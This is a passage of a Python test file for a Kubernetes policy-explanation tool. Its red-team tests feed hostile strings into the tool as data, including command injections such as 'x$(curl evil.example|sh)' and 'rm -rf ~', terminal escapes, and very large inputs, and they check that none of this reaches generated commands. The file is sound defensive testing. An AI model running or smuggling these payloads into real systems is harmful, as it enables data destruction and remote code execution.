        + ["--live"]
    )
    assert rc == 1 and capsys.readouterr().out.startswith("DENIED  shop/deployment/orders-api")


# --- red team: text from logs and manifests is hostile ------------------------------------------------------------


def _commands(out: dict[str, Any]) -> list[str]:
    found: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            if isinstance(node.get("command"), str):
                found.append(node["command"])
            for v in node.values():
                walk(v)
        elif isinstance(node, list):
            for v in node:
                walk(v)

    walk(out)
    return found


def test_hostile_names_never_reach_a_command_line() -> None:
    hostile = "\n".join(
        [
            'User "alice\nrm -rf ~" cannot list resource "pods" in API group "" in the namespace "shop"',
            'User "x$(curl evil.example|sh)" cannot list resource "pods" in API group "" in the namespace "shop"',
            "resource Deployment/x;rm -rf ~/web was blocked due to the following policies\np:\n  r: 'msg'",
            "The deployments \"a\" is invalid: : ValidatingAdmissionPolicy 'p;curl evil|sh' with binding 'b' denied "
            "request: no",
            '\x1b]0;owned\x07admission webhook "validation.gatekeeper.sh" denied the request: [ok] \x1b[31mred',
        ]
    )
    out = explain(hostile)
    for cmd in _commands(out):
        assert not re.search(r"[\n;`$|&]|rm -rf|curl evil", cmd), cmd
    assert "\x1b" not in json.dumps(out) and "\\u001b" not in json.dumps(out)

    manifests = (EXAMPLES / "netpol-shop.yaml").read_text().replace("app: frontend", 'app: "x$(curl evil.example|sh)"')
    reach = check_reachability(Inventory.from_yaml(manifests), "web/frontend", "shop/orders-api", 8080)
    for cmd in _commands(reach):
        assert "$(" not in cmd and "evil" not in cmd, cmd
    with pytest.raises(ValueError, match="bad label"):
        check_reachability(_shop(), "web:a b;rm=x", "shop/orders-api", 8080)


def test_cli_drops_terminal_escapes(capsys: pytest.CaptureFixture[str]) -> None:
    assert main(["policy", "explain", PSA.replace("web", "web\x1b[2J")]) == 0
    assert "\x1b" not in capsys.readouterr().out


@pytest.mark.parametrize(
    "text",
    [
        "a" * 200_000,
        "resource Deployment/x/y was blocked due to the following policies " + ("a" * 300 + ":  ") * 650,
        "kyverno resource Deployment/x/y was blocked due to the following policies\np:\n  r: '" + "a\n" * 100_000,
        "policyeval.stackrox.io\n" + "\n" * 200_000,
        'violates PodSecurity "restricted:latest": ' + "a (b), " * 28_000,
        "exceeded quota: q, requested: " * 6_600,
        "ValidatingAdmissionPolicy '" + "a" * 200_000,
        "unable to validate against any security context constraint: [" * 3_200,
        "x" * 200_000 + " max limit to request ratio",
        'User "' * 33_000,
        ("error " + "a-" * 40_000 + "\n") * 3,  # redaction was quadratic on long dashed tokens (fixed in loop S1)
        "--" + "a." * 100_000,
    ],
)
def test_explain_stays_fast_on_hostile_input(text: str) -> None:
    import time

    # CPU time of this process: a busy machine (parallel jobs) must not fail it, a quadratic path still does
    start = time.process_time()
    explain(text)
    assert time.process_time() - start < 3.0
